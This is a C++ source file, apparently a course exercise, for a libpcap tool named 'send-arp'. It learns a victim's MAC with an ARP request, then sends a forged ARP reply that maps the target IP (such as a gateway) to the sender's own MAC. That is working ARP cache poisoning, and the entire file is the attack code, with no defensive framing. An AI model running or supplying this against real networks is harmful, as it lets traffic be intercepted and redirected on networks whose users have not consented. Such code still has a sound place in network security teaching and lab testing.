#include <stdio.h>
#include <string.h>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int myInfo(char* dev, char* ip, char* mac) {
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s <0) {
        printf("Error");
        return -1;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
        return -1;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        printf("Error");
        return -1;
    }

    sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    close(s);

    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    char* sender_ip = argv[2];
    char* target_ip = argv[3];
    Mac sender_mac;

    EthArpPacket req_packet;

    char my_ip[20] = {0,};
    char my_mac[20] = {0,};
    myInfo(dev, my_ip, my_mac);

    // arp request for sender_mac
    req_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    req_packet.eth_.smac_ = Mac(my_mac);
    req_packet.eth_.type_ = htons(EthHdr::Arp);

    req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    req_packet.arp_.pro_ = htons(EthHdr::Ip4);
    req_packet.arp_.hln_ = Mac::SIZE;
    req_packet.arp_.pln_ = Ip::SIZE;
    req_packet.arp_.op_ = htons(ArpHdr::Request);
    req_packet.arp_.smac_ = Mac(my_mac);
    req_packet.arp_.sip_ = htonl(Ip(my_ip));
    req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    req_packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    EthArpPacket* rep_packet;

    // reply -> sender_mac
    struct pcap_pkthdr* header;
    const u_char* rep_packet1;
    res = pcap_next_ex(handle, &header, &rep_packet1);
    if(res==0) {
        printf("no reply");
        pcap_close(handle);
        return -1;
    }
    if(res==PCAP_ERROR || res==PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        pcap_close(handle);
        return -1;
    }
    rep_packet = (struct EthArpPacket *)rep_packet1;
    sender_mac = (rep_packet->arp_.smac_);    
                
            

    // arp reply
    EthArpPacket rep_packet2;

    rep_packet2.eth_.dmac_ = sender_mac;
    rep_packet2.eth_.smac_ = Mac(my_mac);
    rep_packet2.eth_.type_ = htons(EthHdr::Arp);

    rep_packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
    rep_packet2.arp_.pro_ = htons(EthHdr::Ip4);
    rep_packet2.arp_.hln_ = Mac::SIZE;
    rep_packet2.arp_.pln_ = Ip::SIZE;
    rep_packet2.arp_.op_ = htons(ArpHdr::Reply);
    rep_packet2.arp_.smac_ = Mac(my_mac);
    rep_packet2.arp_.sip_ = htonl(Ip(target_ip));
    rep_packet2.arp_.tmac_ = sender_mac;
    rep_packet2.arp_.tip_ = htonl(Ip(sender_ip));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&rep_packet2), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}
